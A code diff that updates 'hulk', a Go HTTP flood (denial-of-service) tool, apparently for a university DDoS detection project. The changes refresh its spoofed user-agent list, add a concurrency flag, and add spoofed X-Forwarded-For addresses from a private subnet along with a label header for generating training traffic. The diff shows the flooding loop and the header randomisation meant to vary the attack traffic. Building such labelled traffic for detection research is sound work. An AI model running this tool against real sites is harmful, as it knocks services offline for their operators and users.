@@ -23,13 +23,13 @@ import (
 	"syscall"
 )
 
-const __version__  = "1.0.1"
+const __version__ = "1.0.2"
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 const (
-	callGotOk              uint8 = iota
+	callGotOk uint8 = iota
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
@@ -46,19 +46,19 @@ var (
 		//"http://yandex.ru/yandsearch?text=",
 	}
 	headersUseragents []string = []string{
-		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
-		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
-		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
-		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
-		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
-		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+		// Updated user-agents (Matus Remen)
+		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/136.0.7103.56 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/138.1  Mobile/15E148 Safari/605.1.15",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
 	}
 	cur int32
 )
@@ -78,6 +78,7 @@ func main() {
 	var (
 		version bool
 		site    string
+		procs   int
 		agents  string
 		data    string
 		headers arrayFlags
@@ -85,21 +86,25 @@ func main() {
 
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
-	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
+	flag.StringVar(&site, "site", "", "Destination site.")
+	flag.IntVar(&procs, "procs", 1, "Number of concurrent requests.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
-	t := os.Getenv("HULKMAXPROCS")
-	maxproc, err := strconv.Atoi(t)
-	if err != nil {
-		maxproc = 1023
-	}
+	// Take number of procs as an argument instead of env variable (Matus Remen)
+	maxproc := minInt(procs, 1023)
 
+	// Make site argument mandatory (Matus Remen)
+	if site == "" {
+		fmt.Println("Argument -site is required")
+		flag.PrintDefaults()
+		os.Exit(1)
+	}
 	u, err := url.Parse(site)
 	if err != nil {
-		fmt.Println("err parsing url parameter\n")
+		fmt.Println("err parsing url parameter")
 		os.Exit(1)
 	}
 
@@ -131,7 +136,7 @@ func main() {
 		)
 		fmt.Println("In use               |\tResp OK |\tGot err")
 		for {
-			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
+			if atomic.LoadInt32(&cur) < int32(maxproc) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
@@ -195,6 +200,9 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
+		// Add custom headers, relevant to the DDoS detection project (Matus Remen)
+		q.Header.Set("X-Forwarded-For", get_malicious_ip_address())
+		q.Header.Set("X-Label", "1")
 
 		// Overwrite headers with parameters
 
@@ -223,10 +231,34 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 	}
 }
 
+/*
+Return the minimum of two integers.
+Author: Matus Remen (xremen01@stud.fit.vutbr.cz)
+*/
+func minInt(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
 func buildblock(size int) (s string) {
 	var a []rune
 	for i := 0; i < size; i++ {
 		a = append(a, rune(rand.Intn(25)+65))
 	}
 	return string(a)
+}
+
+/*
+Generate a random IP address from the malicious subnet.
+Author: Matus Remen (xremen01@stud.fit.vutbr.cz)
+*/
+func get_malicious_ip_address() string {
+	for {
+		ip_address := fmt.Sprintf("172.%d.%d.%d", rand.Intn(8)+24, rand.Intn(256), rand.Intn(256))
+		if ip_address != "172.24.0.0" && ip_address != "172.31.255.255" {
+			return ip_address
+		}
+	}
 }
